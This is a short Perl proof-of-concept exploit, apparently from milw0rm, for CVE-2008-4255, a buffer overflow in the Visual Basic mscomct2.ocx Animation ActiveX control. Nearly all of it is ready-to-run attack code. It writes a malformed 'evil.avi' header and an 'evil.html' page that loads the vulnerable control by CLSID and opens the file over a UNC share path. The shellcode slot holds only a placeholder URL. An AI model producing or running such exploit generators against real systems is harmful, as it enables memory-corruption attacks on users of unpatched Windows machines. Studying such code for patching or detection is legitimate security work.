#!/usr/bin/perl
# Microsoft Visual Basic ActiveX Controls mscomct2.ocx Animation Object  Buffer Overflow (CVE-2008-4255) PoC
# You'll need Debugging Tools for Windows http://www.microsoft.com/whdc/devtools/debugging/default.mspx
# /JA
# Come to FRHACK!
# www.frhack.org

print "\nMicrosoft Visual Basic ActiveX Controls mscomct2.ocx Animation Object Buffer Overflow (CVE-2008-4255) PoC\n";
print "Generating malicious .AVI file\n";
print "This file should be served via an UNC path\n";
print "[->] Building  evil.avi\n";

my $shellcode = "http://metasploit.com";

$FileHeader =
"\x52\x49\x46\x46\x2C\x08\x00\x00\x41\x56\x49\x20\x73\x74\x72\x68\x10\x00\x00\x00\x76\x69\x64\x73\x20\x20\x20\x20\x00\x00\x00\x00".
"\x00\x00\x00\x00\x73\x74\x72\x66\x00\x08\x00\x00\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

open(my $poc, "> evil.avi");
print $poc $FileHeader;
close($poc);

print "[->] evil.avi generated\n";
print "[->] Building  evil.html\n";

$EvilHTML =
"<html><head></head><body><object id='evil' classid='clsid:B09DE715-87C1-11D1-8BE3-0000F8754DA1'><param name='AutoPlay' value='True'></object>".
"<script language=javascript>evil.Open('\\\\192.168.0.1\\share\\evil.avi');</script></body></html>";

open(my $poc, "> evil.html");
print $poc $EvilHTML;
close($poc);

print "[->] evil.html generated\n";

# milw0rm.com [2008-12-12]